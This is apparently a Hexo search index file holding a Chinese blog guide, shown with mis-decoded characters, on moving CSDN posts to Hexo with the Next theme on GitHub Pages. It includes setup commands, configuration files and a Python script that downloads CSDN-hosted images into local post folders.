<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Blog-Building</title>
    <url>/2024/09/10/Blog-Building/</url>
    <content><![CDATA[<h1 id="ä»CSDNè¿ç§»åšå®¢åˆ°Hexo-Next-GitHub-Pages"><a href="#ä»CSDNè¿ç§»åšå®¢åˆ°Hexo-Next-GitHub-Pages" class="headerlink" title="ä»CSDNè¿ç§»åšå®¢åˆ°Hexo+Next+GitHub Pages"></a>ä»CSDNè¿ç§»åšå®¢åˆ°Hexo+Next+GitHub Pages</h1><p>æœ¬æŒ‡å—ä¸“ä¸ºã€Œä»CSDNå¯¼å‡ºåšå®¢ï¼Œéƒ¨ç½²åˆ°Hexo+Nextä¸»é¢˜GitHub Pagesã€çš„ç”¨æˆ·è®¾è®¡ï¼Œå…¨é¢è§£å†³ï¼š</p>
<ul>
<li>CSDNå¯¼å‡ºå›¾ç‰‡ä¸æ˜¾ç¤ºé—®é¢˜</li>
<li>Hexoé…ç½®é”™è¯¯å¯¼è‡´éƒ¨ç½²å¤±è´¥</li>
<li>è·¯å¾„è§£æå’Œç¼“å­˜å†²çª</li>
<li>GitHub Pageséƒ¨ç½²ç–‘éš¾æ‚ç—‡</li>
<li>åšå®¢ç»“æ„æ··ä¹±ã€åŠŸèƒ½ç¼ºå¤±ã€ä½“éªŒä¸ä½³</li>
</ul>
<h1 id="ä¸€ã€ç¯å¢ƒå‡†å¤‡ä¸é¡¹ç›®åˆå§‹åŒ–"><a href="#ä¸€ã€ç¯å¢ƒå‡†å¤‡ä¸é¡¹ç›®åˆå§‹åŒ–" class="headerlink" title="ä¸€ã€ç¯å¢ƒå‡†å¤‡ä¸é¡¹ç›®åˆå§‹åŒ–"></a>ä¸€ã€ç¯å¢ƒå‡†å¤‡ä¸é¡¹ç›®åˆå§‹åŒ–</h1><p><strong>1.1 å¿…å¤‡ç¯å¢ƒå®‰è£…</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å®‰è£…Node.jsï¼ˆå¿…éœ€v14+ï¼Œæ¨èv18+ï¼‰</span></span><br><span class="line"><span class="comment"># å®˜ç½‘ä¸‹è½½ï¼šhttps://nodejs.org/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…Git</span></span><br><span class="line"><span class="comment"># å®˜ç½‘ä¸‹è½½ï¼šhttps://git-scm.com/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># éªŒè¯å®‰è£…</span></span><br><span class="line">node --version</span><br><span class="line">npm --version</span><br><span class="line">git --version</span><br></pre></td></tr></table></figure>

<p><strong>1.2 GitHubä»“åº“å‡†å¤‡</strong></p>
<ul>
<li>åˆ›å»ºä¸€ä¸ªåä¸º <code>ä½ çš„ç”¨æˆ·å.github.io</code> çš„ä»“åº“ï¼ˆå¿…é¡»æ˜¯æ­¤æ ¼å¼ï¼‰ã€‚</li>
<li><strong>æ¨è</strong>ï¼šé…ç½®SSHå¯†é’¥ä»¥å®ç°å…å¯†æ¨é€ã€‚<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;your_email@example.com&quot;</span></span><br><span class="line"><span class="comment"># å°† ~/.ssh/id_rsa.pub å†…å®¹æ·»åŠ åˆ° GitHub çš„ SSH Keys è®¾ç½®ä¸­</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>1.3 Hexoé¡¹ç›®åˆå§‹åŒ–</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å®‰è£…Hexoå‘½ä»¤è¡Œå·¥å…·</span></span><br><span class="line">npm install -g hexo-cli</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºåšå®¢é¡¹ç›®</span></span><br><span class="line">hexo init myBlog</span><br><span class="line"><span class="built_in">cd</span> myBlog</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…Nextä¸»é¢˜</span></span><br><span class="line">npm install hexo-theme-next --save</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…éƒ¨ç½²æ’ä»¶</span></span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…æœç´¢æ’ä»¶ï¼ˆç”¨äºæœ¬åœ°æœç´¢ï¼‰</span></span><br><span class="line">npm install hexo-generator-searchdb --save</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…ç«™ç‚¹åœ°å›¾æ’ä»¶ï¼ˆç”¨äºSEOï¼‰</span></span><br><span class="line">npm install hexo-generator-sitemap --save</span><br><span class="line">npm install hexo-generator-baidu-sitemap --save  <span class="comment"># å¯é€‰ï¼Œç™¾åº¦ä¸“ç”¨</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="äºŒã€æ ¸å¿ƒé…ç½®æ–‡ä»¶è¯¦è§£"><a href="#äºŒã€æ ¸å¿ƒé…ç½®æ–‡ä»¶è¯¦è§£" class="headerlink" title="äºŒã€æ ¸å¿ƒé…ç½®æ–‡ä»¶è¯¦è§£"></a>äºŒã€æ ¸å¿ƒé…ç½®æ–‡ä»¶è¯¦è§£</h1><p><strong>2.1 Hexoä¸»é…ç½®æ–‡ä»¶ (<code>_config.yml</code>)</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">ZQ-Rookie-Hackerçš„æŠ€æœ¯åšå®¢</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">&#x27;åˆ†äº«ç¼–ç¨‹ã€ç½‘ç»œå®‰å…¨ã€å·¥å…·ä½¿ç”¨æŠ€å·§&#x27;</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">&#x27;ä¸“æ³¨äºHexoåšå®¢æ­å»ºã€å‰ç«¯å¼€å‘ã€ç½‘ç»œå®‰å…¨çš„æŠ€æœ¯åˆ†äº«å¹³å°&#x27;</span></span><br><span class="line"><span class="attr">keywords:</span> [<span class="string">&#x27;Hexo&#x27;</span>, <span class="string">&#x27;åšå®¢æ­å»º&#x27;</span>, <span class="string">&#x27;ç½‘ç»œå®‰å…¨&#x27;</span>, <span class="string">&#x27;SSH&#x27;</span>, <span class="string">&#x27;ç¼–ç¨‹æŠ€å·§&#x27;</span>]</span><br><span class="line"><span class="attr">author:</span> <span class="string">ZQ-Rookie-Hacker</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">https://ä½ çš„ç”¨æˆ·å.github.io</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Directory</span></span><br><span class="line"><span class="attr">source_dir:</span> <span class="string">source</span></span><br><span class="line"><span class="attr">public_dir:</span> <span class="string">public</span></span><br><span class="line"><span class="attr">tag_dir:</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">archive_dir:</span> <span class="string">archives</span></span><br><span class="line"><span class="attr">category_dir:</span> <span class="string">categories</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Writing</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:title.md</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span></span><br><span class="line"><span class="attr">titlecase:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">external_link:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">site</span></span><br><span class="line">  <span class="attr">exclude:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">filename_case:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">render_drafts:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span>  <span class="comment"># ğŸ”‘ å…³é”®ï¼šå¯ç”¨æ–‡ç« èµ„æºæ–‡ä»¶å¤¹ï¼ˆæ¯ç¯‡æ–‡ç« ä¸€ä¸ªæ–‡ä»¶å¤¹å­˜æ”¾å›¾ç‰‡ï¼‰</span></span><br><span class="line"><span class="attr">relative_link:</span> <span class="literal">false</span>     <span class="comment"># ğŸ”‘ å…³é”®ï¼šç¦ç”¨ç›¸å¯¹é“¾æ¥ï¼Œç¡®ä¿è·¯å¾„æ­£ç¡®</span></span><br><span class="line"><span class="attr">future:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Markdowné…ç½®ï¼ˆè§£å†³å›¾ç‰‡æ ¸å¿ƒé—®é¢˜ï¼‰</span></span><br><span class="line"><span class="attr">syntax_highlighter:</span> <span class="string">highlight.js</span></span><br><span class="line"><span class="attr">highlight:</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">auto_detect:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hljs:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">marked:</span></span><br><span class="line">  <span class="attr">prepend_root:</span> <span class="literal">true</span>    <span class="comment"># ğŸ”‘ å…³é”®ï¼šè‡ªåŠ¨ä¸ºç›¸å¯¹è·¯å¾„æ·»åŠ æ ¹è·¯å¾„</span></span><br><span class="line">  <span class="attr">post_asset:</span> <span class="literal">true</span>      <span class="comment"># ğŸ”‘ å…³é”®ï¼šè¯†åˆ«æ–‡ç« èµ„æºæ–‡ä»¶å¤¹ä¸­çš„å›¾ç‰‡</span></span><br><span class="line"></span><br><span class="line"><span class="attr">prismjs:</span></span><br><span class="line">  <span class="attr">preprocess:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å…³é—­ç¼“å­˜é¿å…è·¯å¾„é—®é¢˜</span></span><br><span class="line"><span class="attr">cache:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">next</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@github.com:ä½ çš„ç”¨æˆ·å/ä½ çš„ç”¨æˆ·å.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure>

<p><strong>2.2 Nextä¸»é¢˜é…ç½® (<code>themes/next/_config.yml</code>)</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Scheme Settings (æ¨èç®€æ´å¤§æ°”çš„Geminiæˆ–Mist)</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Gemini</span></span><br><span class="line"><span class="comment"># scheme: Mist</span></span><br><span class="line"><span class="comment"># scheme: Pisces</span></span><br><span class="line"><span class="comment"># scheme: Muse</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dark Mode</span></span><br><span class="line"><span class="attr">darkmode:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Menu Settings</span></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-folder</span>  <span class="comment"># æ–°å¢ï¼šåˆ†ç±»é¡µ</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span>              <span class="comment"># æ–°å¢ï¼šæ ‡ç­¾é¡µ</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-user</span>            <span class="comment"># å¯é€‰ï¼šéœ€å…ˆåˆ›å»ºabouté¡µ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sidebar Settings</span></span><br><span class="line"><span class="attr">sidebar:</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">left</span></span><br><span class="line">  <span class="attr">display:</span> <span class="string">post</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Post Settings</span></span><br><span class="line"><span class="attr">excerpt_description:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">read_more_btn:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å›¾ç‰‡æ‡’åŠ è½½ï¼ˆæå‡åŠ è½½é€Ÿåº¦ï¼‰</span></span><br><span class="line"><span class="attr">lazyload:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»£ç é«˜äº®ä¼˜åŒ–</span></span><br><span class="line"><span class="attr">codeblock:</span></span><br><span class="line">  <span class="attr">copy_button:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ¬åœ°æœç´¢</span></span><br><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">placeholder:</span> <span class="string">æœç´¢æ–‡ç« ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é˜…è¯»é‡ç»Ÿè®¡ï¼ˆä¸è’œå­ï¼‰</span></span><br><span class="line"><span class="attr">busuanzi_count:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_visitors:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">archive_views:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯„è®ºç³»ç»Ÿï¼ˆæ¨èGitalkï¼‰</span></span><br><span class="line"><span class="attr">gitalk:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">client_id:</span> <span class="string">ä½ çš„Client</span> <span class="string">ID</span></span><br><span class="line">  <span class="attr">client_secret:</span> <span class="string">ä½ çš„Client</span> <span class="string">Secret</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">blog-comments</span>  <span class="comment"># ç”¨äºå­˜å‚¨è¯„è®ºçš„GitHubä»“åº“å</span></span><br><span class="line">  <span class="attr">owner:</span> <span class="string">ä½ çš„GitHubç”¨æˆ·å</span></span><br><span class="line">  <span class="attr">admin:</span> [<span class="string">ä½ çš„GitHubç”¨æˆ·å</span>]</span><br><span class="line">  <span class="attr">distraction_free_mode:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SEO</span></span><br><span class="line"><span class="attr">seo:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="ä¸‰ã€CSDNå›¾ç‰‡å¤„ç†ç»ˆææ–¹æ¡ˆ"><a href="#ä¸‰ã€CSDNå›¾ç‰‡å¤„ç†ç»ˆææ–¹æ¡ˆ" class="headerlink" title="ä¸‰ã€CSDNå›¾ç‰‡å¤„ç†ç»ˆææ–¹æ¡ˆ"></a>ä¸‰ã€CSDNå›¾ç‰‡å¤„ç†ç»ˆææ–¹æ¡ˆ</h1><p><strong>3.1 è‡ªåŠ¨åŒ–å›¾ç‰‡ä¸‹è½½ä¸ä¿®å¤è„šæœ¬ (<code>fix_csdn_images.py</code>)</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># ====== ä½ åªéœ€è¦æ”¹è¿™ä¸€è¡Œï¼šä½ çš„æ–‡ç« æ”¾å“ªå„¿ï¼Ÿ ======</span></span><br><span class="line">POSTS_DIR = <span class="string">r&quot;F:\myBlog\source\_posts&quot;</span>  <span class="comment"># ä¿®æ”¹ä¸ºä½ çš„å®é™…è·¯å¾„</span></span><br><span class="line"><span class="comment"># ================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ”¯æŒçš„å›¾ç‰‡æ ¼å¼</span></span><br><span class="line">IMG_EXTENSIONS = (<span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.jpeg&#x27;</span>, <span class="string">&#x27;.gif&#x27;</span>, <span class="string">&#x27;.bmp&#x27;</span>, <span class="string">&#x27;.webp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_image</span>(<span class="params">url, save_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ä¸‹è½½å•å¼ å›¾ç‰‡&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.get(url, headers=headers, timeout=<span class="number">15</span>)</span><br><span class="line">        res.raise_for_status()</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(save_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(res.content)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;âŒ ä¸‹è½½å¤±è´¥ï¼š<span class="subst">&#123;url&#125;</span>ï¼Œé”™è¯¯ï¼š<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_markdown_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å¤„ç†å•ä¸ªMarkdownæ–‡ä»¶&quot;&quot;&quot;</span></span><br><span class="line">    article_name = os.path.splitext(os.path.basename(file_path))[<span class="number">0</span>]</span><br><span class="line">    image_dir = os.path.join(os.path.dirname(file_path), article_name)</span><br><span class="line">    os.makedirs(image_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æŸ¥æ‰¾æ‰€æœ‰CSDNç½‘ç»œå›¾ç‰‡é“¾æ¥</span></span><br><span class="line">    img_pattern = <span class="string">r&#x27;!\[([^\]]*)\]\((https?://[^\s)]+\.(?:png|jpg|jpeg|gif|bmp|webp))\)&#x27;</span></span><br><span class="line">    matches = <span class="built_in">list</span>(re.finditer(img_pattern, content))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ğŸ” æ‰¾åˆ° <span class="subst">&#123;<span class="built_in">len</span>(matches)&#125;</span> å¼ å›¾ç‰‡&quot;</span>)</span><br><span class="line"></span><br><span class="line">    success_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, <span class="keyword">match</span> <span class="keyword">in</span> <span class="built_in">enumerate</span>(matches):</span><br><span class="line">        alt_text = <span class="keyword">match</span>.group(<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;å›¾ç‰‡æè¿°&#x27;</span></span><br><span class="line">        url = <span class="keyword">match</span>.group(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;â¬‡ï¸ æ­£åœ¨ä¸‹è½½ (<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>/<span class="subst">&#123;<span class="built_in">len</span>(matches)&#125;</span>): <span class="subst">&#123;os.path.basename(url)&#125;</span> &quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ç”Ÿæˆå›¾ç‰‡æ–‡ä»¶å</span></span><br><span class="line">        parsed = urlparse(url)</span><br><span class="line">        ext = os.path.splitext(parsed.path)[<span class="number">1</span>].lower()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ext <span class="keyword">or</span> ext <span class="keyword">not</span> <span class="keyword">in</span> IMG_EXTENSIONS:</span><br><span class="line">            ext = <span class="string">&#x27;.png&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ¸…ç†æ–‡ä»¶åä¸­çš„ç‰¹æ®Šå­—ç¬¦</span></span><br><span class="line">        clean_alt = re.sub(<span class="string">r&#x27;[^\w\u4e00-\u9fa5-]&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, alt_text)</span><br><span class="line">        filename_on_disk = <span class="string">f&quot;<span class="subst">&#123;clean_alt&#125;</span>_<span class="subst">&#123;i+<span class="number">1</span>&#125;</span><span class="subst">&#123;ext&#125;</span>&quot;</span> <span class="keyword">if</span> clean_alt <span class="keyword">else</span> <span class="string">f&quot;image_<span class="subst">&#123;i+<span class="number">1</span>&#125;</span><span class="subst">&#123;ext&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        local_path = os.path.join(image_dir, filename_on_disk)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> download_image(url, local_path):</span><br><span class="line">            <span class="comment"># ä½¿ç”¨æ ‡å‡†Markdownè¯­æ³•ï¼Œå¼•ç”¨æœ¬åœ°æ–‡ä»¶</span></span><br><span class="line">            new_link = <span class="string">f&quot;![<span class="subst">&#123;alt_text&#125;</span>](<span class="subst">&#123;filename_on_disk&#125;</span>)&quot;</span></span><br><span class="line">            content = content.replace(<span class="keyword">match</span>.group(<span class="number">0</span>), new_link)</span><br><span class="line">            success_count += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;âœ… å·²ä¿å­˜ï¼š<span class="subst">&#123;filename_on_disk&#125;</span> &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä¿å­˜ä¿®æ”¹åçš„å†…å®¹</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> success_count, <span class="built_in">len</span>(matches)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ğŸš€ å¼€å§‹å¤„ç†CSDNå¯¼å‡ºçš„å›¾ç‰‡...&quot;</span>)</span><br><span class="line">    total_success = <span class="number">0</span></span><br><span class="line">    total_images = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(POSTS_DIR):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> filename.endswith(<span class="string">&#x27;.md&#x27;</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        blog_path = os.path.join(POSTS_DIR, filename)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\nğŸ“„ æ­£åœ¨å¤„ç†ï¼š<span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        success, total = process_markdown_file(blog_path)</span><br><span class="line">        total_success += success</span><br><span class="line">        total_images += total</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ğŸ‰ <span class="subst">&#123;filename&#125;</span> å¤„ç†å®Œæˆï¼š<span class="subst">&#123;success&#125;</span>/<span class="subst">&#123;total&#125;</span> å¼ å›¾ç‰‡æˆåŠŸ&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nğŸŠ å…¨éƒ¨å®Œæˆï¼æ€»è®¡å¤„ç† <span class="subst">&#123;total_success&#125;</span>/<span class="subst">&#123;total_images&#125;</span> å¼ å›¾ç‰‡&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nğŸ“ æ¥ä¸‹æ¥æ‰§è¡Œï¼š&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   hexo clean &amp;&amp; hexo generate &amp;&amp; hexo server&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><strong>3.2 ä½¿ç”¨è¯´æ˜</strong></p>
<ol>
<li><strong>ä¿®æ”¹è·¯å¾„</strong>ï¼šå°†è„šæœ¬ä¸­çš„ <code>POSTS_DIR</code> ä¿®æ”¹ä¸ºä½ åšå®¢æ–‡ç« çš„å®é™…è·¯å¾„ï¼ˆå¦‚ <code>F:\myBlog\source\_posts</code>ï¼‰ã€‚</li>
<li><strong>è¿è¡Œè„šæœ¬</strong>ï¼šåœ¨å‘½ä»¤è¡Œä¸­è¿›å…¥è„šæœ¬æ‰€åœ¨ç›®å½•ï¼Œæ‰§è¡Œ <code>python fix_csdn_images.py</code>ã€‚</li>
<li><strong>éªŒè¯ç»“æ„</strong>ï¼šè„šæœ¬æ‰§è¡Œåï¼Œä½ çš„æ–‡ç« ç›®å½•ç»“æ„åº”å˜ä¸ºï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source/_posts/</span><br><span class="line">â”œâ”€â”€ SSHéš§é“æŠ€æœ¯.md</span><br><span class="line">â””â”€â”€ SSHéš§é“æŠ€æœ¯/</span><br><span class="line">    â”œâ”€â”€ å›¾ç‰‡æè¿°_1.png</span><br><span class="line">    â”œâ”€â”€ å›¾ç‰‡æè¿°_2.jpg</span><br><span class="line">    â””â”€â”€ ...</span><br></pre></td></tr></table></figure></li>
<li><strong>æœ¬åœ°é¢„è§ˆ</strong>ï¼šæ‰§è¡Œ <code>hexo clean &amp;&amp; hexo generate &amp;&amp; hexo server</code>ï¼Œåœ¨æµè§ˆå™¨ä¸­è®¿é—® <code>http://localhost:4000</code>ï¼Œç¡®è®¤å›¾ç‰‡å·²æ­£å¸¸åŠ è½½ã€‚</li>
</ol>
<hr>
<h1 id="å››ã€æ ¸å¿ƒï¼šæ­å»ºæ¸…æ™°çš„ã€Œåˆ†ç±»-æ ‡ç­¾ã€ä½“ç³»ï¼ˆè§£å†³æ–‡ç« å½’ç±»é—®é¢˜ï¼‰"><a href="#å››ã€æ ¸å¿ƒï¼šæ­å»ºæ¸…æ™°çš„ã€Œåˆ†ç±»-æ ‡ç­¾ã€ä½“ç³»ï¼ˆè§£å†³æ–‡ç« å½’ç±»é—®é¢˜ï¼‰" class="headerlink" title="å››ã€æ ¸å¿ƒï¼šæ­å»ºæ¸…æ™°çš„ã€Œåˆ†ç±»&#x2F;æ ‡ç­¾ã€ä½“ç³»ï¼ˆè§£å†³æ–‡ç« å½’ç±»é—®é¢˜ï¼‰"></a>å››ã€æ ¸å¿ƒï¼šæ­å»ºæ¸…æ™°çš„ã€Œåˆ†ç±»&#x2F;æ ‡ç­¾ã€ä½“ç³»ï¼ˆè§£å†³æ–‡ç« å½’ç±»é—®é¢˜ï¼‰</h1><p>åˆ†ç±»æ˜¯åšå®¢çš„â€œéª¨æ¶â€ï¼Œæ ‡ç­¾æ˜¯â€œç´¢å¼•â€ï¼Œä¸¤è€…ç»“åˆè®©è¯»è€…å¿«é€Ÿæ‰¾åˆ°å†…å®¹ï¼Œä¹Ÿè®©ä½ çš„åšå®¢ç»“æ„æ›´è§„æ•´ã€‚</p>
<p><strong>4.1 å…ˆæ˜ç¡®è§„åˆ™ï¼ˆé¿å…æ··ä¹±ï¼‰</strong></p>
<ul>
<li><strong>åˆ†ç±»</strong>ï¼šå±‚çº§åŒ–ã€ä¸é‡å¤ï¼ˆä¾‹å¦‚ï¼š<code>æŠ€æœ¯</code> â†’ <code>ç½‘ç»œå®‰å…¨</code>ï¼Œ<code>å·¥å…·</code> â†’ <code>Hexoé…ç½®</code>ï¼‰ã€‚ä¸€ç¯‡æ–‡ç« å»ºè®®1-2ä¸ªä¸»åˆ†ç±»ã€‚</li>
